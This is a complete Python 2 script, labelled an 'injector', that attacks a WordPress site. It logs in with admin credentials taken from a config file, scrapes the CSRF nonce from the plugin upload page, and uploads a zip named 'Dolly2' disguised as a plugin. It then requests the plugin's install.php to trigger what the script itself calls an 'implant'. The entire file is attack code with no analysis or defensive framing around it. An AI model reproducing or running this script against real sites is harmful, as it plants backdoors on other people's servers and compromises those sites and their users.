import re, time
import sys
import base64
import readline
import requests
import argparse
from random import choice
from string import ascii_lowercase
import config

##### INJECTOR CONFIG ######
username = config.wp_user
password = config.wp_pass
host = config.target
plugin_name = config.plugin
##### INJECTOR CONFIG ######

filename = "Dolly2"
url = host + '/wp-login.php'
headers = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
'Accept-Encoding' : 'none'
}

payload = {
'log': username,
'pwd': password,
'rememberme': 'forever',
'wp-submit': 'log In',
'redirect_to': host + '/wp-admin/',
'testcookie': 1,
}

uploaddir = "Dolly2"

session = requests.Session()

r = session.post(url, headers=headers, data=payload)

if r.status_code == 200:
    print "Found Login Page"

r3 = session.get(host + '/wp-admin/plugin-install.php?tab=upload',headers=headers)
if r3.status_code == 200:
        print "Logged in as Admin"

look_for = 'name="_wpnonce" value="'
try:
    nonceText = r3.text.split(look_for, 1)[1]
    nonce = nonceText[0:10]
    print "Found CSRF Token: " + nonce
except:
    print "Didn't find a CSRF token, check the URL and/or credentials."
    sys.exit(2)

files = {
'pluginzip': (uploaddir + '.zip',
open(filename +'.zip', 'rb')),
'_wpnonce': (None, nonce),
'_wp_http_referer': (None, host + '/wp-admin/plugin-install.php?tab=upload'),
'install-plugin-submit': (None,'Install Now')

}

r4 = session.post(host + "/wp-admin/update.php?action=upload-plugin",headers=headers, files=files)
if r.status_code == 200:
    print "Implant uploaded!"
    if "Plugin installed successfully" in r4.text:
        print "Plugin installed successfully"

    if "Destination folder already exists" in r4.text:
        print "Destination folder already exists"

time.sleep(5)
inject_packet = requests.get(host + "/wp-content/plugins/" + plugin_name + "/install.php?go=go")

print "Implant injected"
